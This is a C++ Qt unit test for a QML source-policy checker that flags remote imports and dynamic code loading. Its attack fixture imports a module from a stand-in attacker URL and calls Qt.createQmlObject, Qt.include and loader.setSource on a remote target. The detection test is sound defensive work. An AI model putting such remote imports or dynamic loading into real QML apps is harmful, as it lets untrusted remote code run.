#include "QmlSourcePolicy.h"

#include <QTest>

class QmlSourcePolicyTest final : public QObject
{
    Q_OBJECT

private slots:
    void rejectsDynamicConstructionLoadingAndImports();
    void ignoresCommentsStringsAndStaticComponents();
};

void QmlSourcePolicyTest::rejectsDynamicConstructionLoadingAndImports()
{
    const QByteArray source = R"QML(
import QtQuick
import "https://attacker.invalid/module"
Item {
  property var q: Qt
  property string target: "remote.qml"
  Loader { source: target }
  Loader { sourceComponent: safeComponent }
  function attack(loader, name) {
    q["create" + "Component"](target)
    Qt[name](target)
    Qt.createQmlObject(target, loader)
    Qt.include(target)
    loader.setSource(target)
    import(target)
  }
}
)QML";
    const QStringList violations = QmlSourcePolicy::violations(source);
    QVERIFY(violations.contains(QStringLiteral("remote-import")));
    QVERIFY(violations.contains(QStringLiteral("qml-create-component")));
    QVERIFY(violations.contains(QStringLiteral("qt-dynamic-member")));
    QVERIFY(violations.contains(QStringLiteral("qml-create-object")));
    QVERIFY(violations.contains(QStringLiteral("qt-include")));
    QVERIFY(violations.contains(QStringLiteral("dynamic-loader-source")));
    QVERIFY(violations.contains(QStringLiteral("loader-set-source")));
    QVERIFY(violations.contains(QStringLiteral("dynamic-import")));
}

void QmlSourcePolicyTest::ignoresCommentsStringsAndStaticComponents()
{
    const QByteArray source = R"QML(
import QtQuick
Item {
  // Qt.createComponent("ignored.qml")
  property string documentation: "Qt.createQmlObject and loader.setSource and import(x)"
  property Component safeComponent: Component { Item {} }
  Loader { sourceComponent: safeComponent }
}
)QML";
    QCOMPARE(QmlSourcePolicy::violations(source), QStringList{});
}

QTEST_MAIN(QmlSourcePolicyTest)
#include "tst_qml_source_policy.moc"
